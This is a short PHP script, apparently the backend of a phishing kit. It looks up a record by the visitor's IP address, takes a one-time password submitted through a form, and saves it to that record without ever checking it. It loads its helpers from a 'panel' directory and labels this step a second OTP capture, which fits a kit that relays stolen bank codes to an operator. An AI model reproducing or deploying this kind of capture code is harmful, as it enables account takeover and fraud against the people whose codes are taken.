<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$registro = traer_regitro($ip);

$otp = $_POST['otp'];

actualizar_registro_otp2($registro,$otp);
?>